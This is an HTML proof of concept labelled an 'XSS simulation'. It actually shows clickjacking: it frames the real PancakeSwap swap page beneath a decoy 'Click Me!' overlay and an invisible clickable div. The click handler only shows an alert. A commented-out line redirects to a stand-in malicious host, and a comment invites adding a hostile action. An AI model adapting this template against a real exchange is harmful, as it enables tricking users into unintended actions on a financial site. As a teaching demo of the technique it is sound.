<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced XSS Simulation</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f0f0f0;
            position: relative;
        }
        .iframe-container {
            position: relative;
            width: 100%;
            height: 100%;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
            opacity: 0.7;
        }
        .overlay {
            position: absolute;
            top: 50%; /* Example position */
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.3);
            color: white;
            padding: 10px 20px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            z-index: 2;
            text-align: center;
        }
        /* Specific clickable area - this is now invisible */
        .click-area {
            position: absolute;
            top: 30%;
            left: 30%;
            width: 150px;
            height: 50px;
            background-color: rgba(255, 0, 0, 0.5); /* Red background */
            color: white;
            text-align: center;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
            z-index: 3;
            opacity: 0; /* Make it invisible but still clickable */
        }
        .click-area:hover {
            background-color: rgba(255, 0, 0, 0.8);
        }
    </style>
</head>
<body>
    <div class="iframe-container">
        <!-- Iframe containing PancakeSwap -->
        <iframe src="https://pancakeswap.finance/swap" frameborder="0"></iframe>

        <!-- The overlay will be visible with no action -->
        <div class="overlay">
            Click Me! <!-- This will remain visible with no action attached -->
        </div>

        <!-- The clickable area is invisible, but still clickable -->
        <div class="click-area" onclick="triggerAction()">
            <!-- The text is still here but will not be visible -->
            Click Here to Trigger Action
        </div>
    </div>

    <script>
        // This function triggers a specific action based on the clicked area
        function triggerAction() {
            alert('You clicked in the specified area! This could be part of a clickjacking attack.');
            // Here, you can insert the desired XSS action such as redirecting the user
            // window.location.href = 'https://evilsite.com';
        }
    </script>
</body>
</html>
